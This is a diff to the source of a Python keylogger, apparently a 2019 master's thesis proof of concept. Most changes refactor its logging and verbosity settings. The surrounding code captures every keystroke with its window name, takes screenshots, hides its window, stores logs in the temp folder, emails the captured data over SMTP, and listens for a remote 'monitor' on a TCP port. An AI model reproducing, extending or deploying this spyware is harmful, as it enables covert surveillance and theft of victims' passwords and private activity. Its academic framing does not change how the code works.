@@ -141,20 +141,26 @@ class ScreenShootThread (threading.Thread):
         self.screen_file = screen_filename
 
     def run(self):
-        logging.info("Guardado captura " + self.screen_file)
-        app = wx.App()  # Need to create an App instance before doing anything
+        msg = "Guardado captura " + self.screen_file
+        logging.info(msg)
+        if verbose >= 1:
+            print(msg)
+        app = wx.App()                  # Need to create an App instance before doing anything
         screen = wx.ScreenDC()
         size_x, size_y = screen.GetSize()
         bmp = wx.EmptyBitmap(size_x, size_y, -1)
         mem = wx.MemoryDC(bmp)
         mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
-        del mem  # libera memoria que contiene captura de imagen
-        del app  # libera objeto de instancia de la aplicación
+        del mem                         # libera memoria que contiene captura de imagen
+        del app                         # libera objeto de instancia de la aplicación
         bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
-        logging.info("Fin captura " + self.screen_file)
+        msg = "Fin captura " + self.screen_file
+        logging.debug(msg)
+        if verbose >= 2:
+            print(msg)
         # Send screenshot to remote servers
         # ... pending ...
-        pass
+
 
 # Clase multihilo que pone un servidor a la escucha para recibir peticiones del Monitor y
 # crea un cliente para la respuesta
@@ -167,23 +173,33 @@ class ClientThread(threading.Thread):
         self.ip = ip
         self.port = port
         self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,ENCODING))
-        logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
 
     def run(self):
+        msg = "Recibida petición de Monitor desde " + self.ip + ":" + str(self.port)
+        logging.info(msg)
+        if verbose >= 1:
+            print(msg)
         while True:
             data = str(self.conn.recv(2048))
-            logging.debug("El monitor ha enviado:" + data)
+            msg = "El monitor ha enviado:" + data
+            logging.debug(msg)
+            if verbose >= 2:
+                print(msg)
             if data == MAGIC_MESSAGE:
-                message = "Conexion establecida"
+                msg = "Conexion establecida"
                 self.conn.send(MAGIC_RESPONSE_PLAIN)
-                logging.debug(message)
+                logging.debug(msg)
+                if verbose >= 2:
+                    print(msg)
                 # Inicia comunicación inversa para enviar datos al Monitor
                 # Starts reverse comunication to send data to Monitor
                 # ... pending ...
             else:
-                message = "No tiene permiso"
-                self.conn.send(bytes(message,ENCODING))
-                logging.debug(message)
+                msg = "No tiene permiso"
+                self.conn.send(bytes(msg,ENCODING))
+                logging.debug(msg)
+                if verbose >= 2:
+                    print(msg)
                 break
 
 
@@ -195,7 +211,10 @@ class ServerListenerThread(threading.Thread):
         self.port = port
         self.buffer_size = buffer_size
         self.threads = []
-        logging.debug('Creando servidor en IP '+str(ip)+' y puerto '+str(port))
+        msg = 'Creando servidor en IP '+str(ip)+' y puerto '+str(port)
+        logging.debug(msg)
+        if verbose >= 1:
+            print(msg)
 
     def run(self):
         tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -204,11 +223,14 @@ class ServerListenerThread(threading.Thread):
 
         while True:
             tcpServer.listen(SERVER_MAX_CLIENTS)    # 5 clients are more than enough. Normally there is only 1 monitor.
-            logging.info("Demon's Eye Keylogger server : Waiting connection from Monitor...")
+            msg = APPNAME + " " + VERSION + " : Waiting connection from Monitor..."
+            logging.info(msg)
+            if verbose >= 1:
+                print(msg)
             (conn, (ip, port)) = tcpServer.accept()
-            newthread = ClientThread(conn, ip, port)
-            newthread.start()
-            self.threads.append(newthread)      # Inicia thread de respuesta - Starts client response thread
+            new_thread = ClientThread(conn, ip, port)
+            new_thread.start()
+            self.threads.append(new_thread)         # Inicia thread de respuesta - Starts client response thread
 
 
 ########################################################
@@ -255,11 +277,15 @@ def send_email(message):
         server.starttls()
         server.login(email_username, email_password)
         server.sendmail(email_from_addr, email_to_addrs, message)
-        server.quit()
 
-    except:
-        logging.error('No he podido enviar mensaje')
-        pass
+    except Exception as ex:
+        msg = 'No he podido enviar mensaje (' + ex + ')'
+        logging.error(msg)
+        if verbose >= 1:
+            print(msg)
+
+    finally:
+        server.quit()
 
 
 # Oculta la ventana de la aplicación - Hide the application window
@@ -298,7 +324,10 @@ def register_system_info():
 def register_window_name(text):
     global key_buffer
     key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
-    logging.debug('Window Name '+text)
+    msg = 'Window Name '+text
+    logging.debug(msg)
+    if verbose >= 3:
+        print(msg)
     return True
 
 
@@ -340,7 +369,10 @@ def delete_keylog_tempfile(pattern = None, logmsg = "Delete Temporal file"):
     count = 0
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
-        logging.info(logmsg +" : " + file_remove)
+        msg = logmsg +" : " + file_remove
+        logging.info(msg)
+        if verbose >= 3:
+            print(msg)
         os.remove(file_remove)
         count += 1
 
@@ -355,7 +387,10 @@ def create_keylog_file():
     # Create keylog file in the user's temporary folder
     prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
     ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
-    logging.info('Create keylogger file ' + keylog_name)
+    msg = 'Create keylogger file ' + keylog_name
+    logging.info(msg)
+    if verbose >= 2:
+        print(msg)
     f = open(keylog_name, 'w+')
     f.close()
 
@@ -442,21 +477,25 @@ def on_mouse_event(event):
 def on_keyboard_event(event):
     global key_buffer, key_counter, old_event
 
-    # debug code
+    msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
     logging.debug('Time: ' + repr(event.Time))
     logging.debug('MessageName: ' + repr(event.MessageName) +' Message: ' + repr(event.Message))
     logging.debug('Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName)
     logging.debug('Ascii: ' + repr(event.Ascii) + repr(chr(event.Ascii)))
-    logging.debug('Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID))
+    logging.debug(msg)
     logging.debug('ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended))
     logging.debug('Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt))
     logging.debug('Transition: ' + repr(event.Transition))
+    if verbose >= 3:
+        print(msg)
 
     # Si presiona combinación especial para salir y desactivar el KeyLogger
     # If especial key to close keylogger is pressed
     if event.Ascii == KEYCODE_EXIT:
         msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
         logging.info(msg)
+        if verbose >= 2:
+            print(msg)
         key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
         sys.exit(0)
 
@@ -515,14 +554,14 @@ def parse_params():
                                      epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
     parser.add_argument("-s", "--start", action='store_true', required=True,
                         help="Specify -s or --start to start Keylogger")
+    parser.add_argument("-v", "--verbose", type=int, choices=[0, 1, 2, 3], default=0,
+                        help="Debug verbose to screen. Default value: 0")
     parser.add_argument("-p", "--ports", type=int, nargs='+',
                         help="Specify a list of ports to scan. " )
     parser.add_argument("-m", "--message", type=str, default=MAGIC_MESSAGE,
                         help="Message to send to host. If empty, -m '', then not message is sent. Default value: " + MAGIC_MESSAGE)
     parser.add_argument("-t", "--timeout", type=int,
                         help="Timeout in seconds on port connection. ")
-    parser.add_argument("-v", "--verbose", type=int, choices=[0,1,2], default=0,
-                        help="Increase output verbosity. Default value: 0")
     args = parser.parse_args()
     return args
 
@@ -550,10 +589,8 @@ driveunit = os.path.splitdrive(__file__)[0]
 # Parsea parametros recibidos - Parse parameters
 # Check and parse parameters
 args = parse_params()
-'''
 verbose = args.verbose
-net_range = args.range
-port_list = args.ports
+'''
 message = args.message
 timeout = args.timeout
 '''
